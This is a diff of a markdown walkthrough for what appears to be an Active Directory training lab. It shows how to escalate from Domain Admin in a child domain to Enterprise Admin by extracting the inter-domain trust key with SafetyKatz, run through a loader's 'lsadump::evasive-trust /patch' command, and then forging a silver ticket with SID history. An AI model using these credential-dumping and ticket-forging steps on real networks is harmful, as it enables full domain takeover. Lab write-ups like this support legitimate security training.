@@ -2,21 +2,26 @@
 
 ## Tasks
 
-1. **Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to "Enterprise Admins" using the domain trust key**
+1. **Using DA access to `dollarcorp.moneycorp.local`, extract the trust key for `moneycorp.local` and escalate privileges to EA by forging a silver ticket**
+
+---
+
+## Attack Path Steps
+
+- **Access to the Child DC with DA Privileges**
+- **Extract the Trust Key for the Parent Domain from the Child DC**
+- **Forge a Silver Ticket with EA SID History for Privilege Escalation**
+- **Leverage the Forged Ticket to Gain EA Access on the Parent DC**
 
 ---
 
 ## Solution
 
-1. **Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to "Enterprise Admins" using the domain trust key**
+1. **Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to EA using the domain trust key**
 
-**Extract the trust key**
+- **Access to the Child DC with DA Privileges**
 
-We need the trust key for the trust between `dollarcorp` and `moneycorp`, which can be retrieved using Mimikatz or SafetyKatz.
-
-Start a process with DA privileges.
-
-Run the below command **from an elevated command prompt**.
+We need the trust key for the trust between `dollarcorp` (child domain) and `moneycorp` (parent domain), which can be retrieved using Mimikatz or SafetyKatz.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -113,6 +118,8 @@ C:\Users\svcadmin>
 
 ![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_18_hfs_safetykatz.png)
 
+- **Extract the Trust Key for the Parent Domain from the Child DC**
+
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"`:
 ```
 [SNIP]
@@ -131,9 +138,7 @@ Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [SNIP]
 ```
 
-**Forge the ticket**
-
-Let's forge a **silver ticket** with SID History of "Enterprise Admins". Run the below command.
+- **Forge a Silver Ticket with EA SID History for Privilege Escalation**
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
@@ -193,6 +198,8 @@ doIGPjCCBjqgAwIBBaEDAgEWooIFCjCCBQZhggUCMIIE/qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
 
 [SNIP]
 ```
+
+- **Leverage the Forged Ticket to Gain EA Access on the Parent DC**
 
 Copy the base64 encoded ticket from above and use it in the following command.
 
